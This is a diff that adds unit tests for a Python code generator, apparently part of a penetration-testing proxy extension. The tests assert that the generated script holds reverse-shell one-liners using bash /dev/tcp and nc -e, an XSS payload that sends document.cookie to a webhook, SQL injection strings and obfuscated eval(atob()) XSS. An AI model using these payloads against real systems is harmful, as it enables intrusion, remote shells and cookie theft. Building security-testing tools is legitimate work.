@@ -155,5 +155,150 @@ class TestPythonParser(unittest.TestCase):
         self.assertIn("def main():", clipboard_data)
         self.assertIn('if __name__ == "__main__":', clipboard_data)
 
+    def test_configurable_reverse_shell_ip(self):
+        """Test that REVERSE_SHELL_IP configuration variable is present"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('REVERSE_SHELL_IP = "127.0.0.1"', clipboard_data)
+
+    def test_configurable_reverse_shell_port(self):
+        """Test that REVERSE_SHELL_PORT configuration variable is present"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('REVERSE_SHELL_PORT = 1337', clipboard_data)
+
+    def test_configurable_webhook_url(self):
+        """Test that WEBHOOK_URL configuration variable is present"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('WEBHOOK_URL = "https://webhook.site/your-unique-id"', clipboard_data)
+
+    def test_xss_payload_variable(self):
+        """Test that XSS_PAYLOAD configuration variable is present with webhook beacon"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('XSS_PAYLOAD = """const a = async () => {', clipboard_data)
+        self.assertIn('navigator.sendBeacon(\\"{WEBHOOK_URL}\\", document.cookie);', clipboard_data)
+
+    def test_sqli_payloads_array(self):
+        """Test that SQLi payloads array is present"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('sqli_payloads = [', clipboard_data)
+        self.assertIn("\"' OR '1'='1\"", clipboard_data)
+        self.assertIn("\"admin' --\"", clipboard_data)
+        self.assertIn("\"' UNION SELECT NULL--\"", clipboard_data)
+
+    def test_xss_payloads_array(self):
+        """Test that XSS payloads array is present with base64 encoded payload"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('xss_payloads = [', clipboard_data)
+        self.assertIn('eval(atob(', clipboard_data)
+        self.assertIn('base64.b64encode', clipboard_data)
+        self.assertIn('<img src=x onerror=alert(1)>', clipboard_data)
+
+    def test_reverse_shell_payloads_array(self):
+        """Test that reverse shell payloads array uses configurable variables"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('reverse_shell_payloads = [', clipboard_data)
+        self.assertIn('f"bash -i >& /dev/tcp/{REVERSE_SHELL_IP}/{REVERSE_SHELL_PORT} 0>&1"', clipboard_data)
+        self.assertIn('f"nc -e /bin/sh {REVERSE_SHELL_IP} {REVERSE_SHELL_PORT}"', clipboard_data)
+
+    def test_reverse_shell_payloads_use_variables(self):
+        """Test that all reverse shell payloads use the configuration variables"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        # Check that hardcoded IPs are not present in reverse shell payloads
+        self.assertNotIn('10.0.0.1', clipboard_data)
+        self.assertNotIn('4242', clipboard_data)
+        # Verify variables are used
+        self.assertIn('{REVERSE_SHELL_IP}', clipboard_data)
+        self.assertIn('{REVERSE_SHELL_PORT}', clipboard_data)
+
+    def test_payload_selection_comments(self):
+        """Test that commented payload selection is present in main()"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('# payloads = sqli_payloads', clipboard_data)
+        self.assertIn('# payloads = xss_payloads', clipboard_data)
+        self.assertIn('# payloads = reverse_shell_payloads', clipboard_data)
+
+    def test_execute_parallel_requests_function(self):
+        """Test that execute_parallel_requests function is present for load testing"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('def execute_parallel_requests(request_func, payloads, max_workers=10):', clipboard_data)
+        self.assertIn('ThreadPoolExecutor', clipboard_data)
+        self.assertIn('as_completed', clipboard_data)
+
+    def test_configuration_variables_order(self):
+        """Test that configuration variables are at the top in correct order"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        # Find positions of key elements
+        reverse_shell_ip_pos = clipboard_data.find('REVERSE_SHELL_IP')
+        reverse_shell_port_pos = clipboard_data.find('REVERSE_SHELL_PORT')
+        webhook_url_pos = clipboard_data.find('WEBHOOK_URL')
+        xss_payload_pos = clipboard_data.find('XSS_PAYLOAD')
+        construct_url_pos = clipboard_data.find('def construct_url')
+        
+        # Configuration should come before functions
+        self.assertLess(reverse_shell_ip_pos, construct_url_pos)
+        self.assertLess(reverse_shell_port_pos, construct_url_pos)
+        self.assertLess(webhook_url_pos, construct_url_pos)
+        self.assertLess(xss_payload_pos, construct_url_pos)
+        
+        # Check relative order of config variables
+        self.assertLess(reverse_shell_ip_pos, reverse_shell_port_pos)
+        self.assertLess(reverse_shell_port_pos, webhook_url_pos)
+
+    def test_request_function_parameters(self):
+        """Test that request function has all required parameters"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('timeout=30', clipboard_data)
+        self.assertIn('verify_ssl=True', clipboard_data)
+        self.assertIn('proxies=None', clipboard_data)
+
+    def test_url_dictionary_structure(self):
+        """Test that URLs are dictionaries not objects"""
+        tree = MockRequestTree(method="GET")
+        
+        PythonParser([tree], self.callbacks, None, True)
+        
+        self.assertIn('"domain":', clipboard_data)
+        self.assertIn('"protocol":', clipboard_data)
+        self.assertIn('"port":', clipboard_data)
+        self.assertIn('"path":', clipboard_data)
+        self.assertIn('"parameters":', clipboard_data)
+        # Ensure no UrlObject class
+        self.assertNotIn('class UrlObject', clipboard_data)
+
 if __name__ == '__main__':
     unittest.main()
